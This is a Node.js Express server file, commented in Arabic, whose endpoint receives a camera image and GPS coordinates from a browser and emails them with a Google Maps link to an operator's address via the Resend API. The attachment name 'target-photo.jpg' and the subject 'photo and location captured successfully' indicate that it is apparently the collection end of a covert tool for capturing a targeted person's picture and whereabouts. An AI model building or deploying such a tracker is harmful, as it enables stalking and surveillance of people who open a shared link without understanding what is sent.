// language: JavaScript (Node.js), file: server.js
import "dotenv/config";
import express from "express";

const app = express();
app.use(express.json({ limit: "8mb" }));
app.use(express.static("public"));

const port = Number(process.env.PORT || 3000);

app.post("/api/share", async (req, res) => {
  try {
    const { imageDataUrl, latitude, longitude, accuracy } = req.body ?? {};
    if (typeof imageDataUrl !== "string" || !/^data:image\/(jpeg|png|webp);base64,/.test(imageDataUrl)) {
      return res.status(400).json({ error: "صورة غير صالحة." });
    }
    if (!Number.isFinite(latitude) || !Number.isFinite(longitude) ||
        latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
      return res.status(400).json({ error: "إحداثيات الموقع غير صالحة." });
    }

    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    // إرسال البريد عبر API الخاص بـ Resend (يعمل مجاناً 100% على Render)
    const response = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${process.env.RESEND_API_KEY}`
      },
      body: JSON.stringify({
        from: "Photo Share <onboarding@resend.dev>", // يمكنك استخدام هذا البريد التجريبي مجاناً
        to: [process.env.MAIL_TO],
        subject: "تم التقاط صورة وموقع جديد بنجاح",
        html: `<p><b>الإحداثيات:</b> ${latitude}, ${longitude}</p>
          <p><b>دقة الموقع:</b> ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}</p>
          <p><a href="${mapsUrl}">فتح الموقع على خرائط جوجل</a></p>`,
        attachments: [{
          filename: "target-photo.jpg",
          content: imageDataUrl.split(",")[1]
        }]
      })
    });

    const result = await response.json();
    if (!response.ok) throw new Error(result.message || "فشل الإرسال عبر الخدمة.");

    res.json({ ok: true, message: "تم إرسال الصورة والموقع بنجاح." });
  } catch (error) {
    console.error("Email delivery failed:", error);
    res.status(500).json({ error: "تعذر إرسال البيانات عبر البريد." });
  }
});

app.listen(port, () => console.log(`Server listening on port ${port}`));
